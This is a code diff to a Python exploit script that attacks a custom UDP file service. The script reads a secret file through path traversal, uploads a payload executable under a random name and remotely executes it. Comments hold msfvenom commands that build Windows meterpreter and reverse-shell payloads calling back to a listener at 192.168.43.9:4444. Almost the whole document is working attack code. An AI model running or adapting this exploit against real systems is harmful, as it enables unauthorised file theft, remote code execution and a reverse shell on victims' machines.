@@ -1,6 +1,8 @@
 import socket
 import sys
 import struct
+import os
+from binascii import hexlify
 import threading
 
 p32be = lambda x : struct.pack("!L", x)
@@ -12,6 +14,7 @@ TIMEOUT = 5
 PAYLOAD_NAME = "payload.exe"
 
 # msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=192.168.43.9 LPORT=4444 -f exe > payload.exe
+# msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.168.43.9 LPORT=4444 -f exe > payload.exe
 def GetPaylaod():
     return open(PAYLOAD_NAME, 'rb').read()
 
@@ -57,7 +60,7 @@ def openFileW(fName):
 
 def writeFile(token, data):
     packet = b'UP'
-    payload = b"\x02\x02" + p32be(token) + p32be(len(data)) + data 
+    payload = b"\x02\x02" + p32be(token) + p32be(len(data)) + data
     packet += p32be(len(payload)) + p32be(crc(payload)) + payload
     return packet
 
@@ -84,7 +87,7 @@ def test(args):
     s.settimeout(TIMEOUT)
 
     target = (host, PORT)
-    s.sendto(openFileR(b"..\\..\\secret.txt"), target)
+    s.sendto(openFileR(b"..\\secret.txt"), target)
     data = None
     data = recvfromT(s)
     print("data = ", data)
@@ -121,7 +124,7 @@ def exploit(args):
     
     # file open to read
     print("[+] Open file to read send!")
-    s.sendto(openFileR(b"..\\..\\secret.txt"), target)
+    s.sendto(openFileR(b"..\\secret.txt"), target)
     data = recvfromT(s)
 
     # get token of session
@@ -148,7 +151,9 @@ def exploit(args):
     recvfromT(s)
 
     # open file to write
-    packet = openFileW(b"..\\executables\\test1.exe")
+    name = hexlify(os.urandom(8)) + b".exe"
+    
+    packet = openFileW(b"..\\executables\\" + name)
     print("[+] Open file to write send!")
     s.sendto(packet, target)
     data = recvfromT(s)
@@ -165,7 +170,7 @@ def exploit(args):
     # write data in file
     # now write payload
     buf = GetPaylaod()
-    print("buf = {}, len ={}".format(buf, len(buf)))
+    #print("buf = {}, len ={}".format(buf, len(buf)))
     packet = writeFile(token, buf)
     print("[+] Write file data send!")
     s.sendto(packet, target)
@@ -180,7 +185,7 @@ def exploit(args):
     s.sendto(packet, target)
     data = recvfromT(s)
 
-    packet = execFile(password, b"test1.exe")
+    packet = execFile(password,  name)
     print("[+] Exec file send!")
     s.sendto(packet, target)
     data = recvfromT(s)
@@ -190,6 +195,7 @@ def exploit(args):
 
 if __name__ == "__main__":
     exploit(sys.argv)
+    #test(sys.argv)
     # threads = []
 
     # for i in range(32):
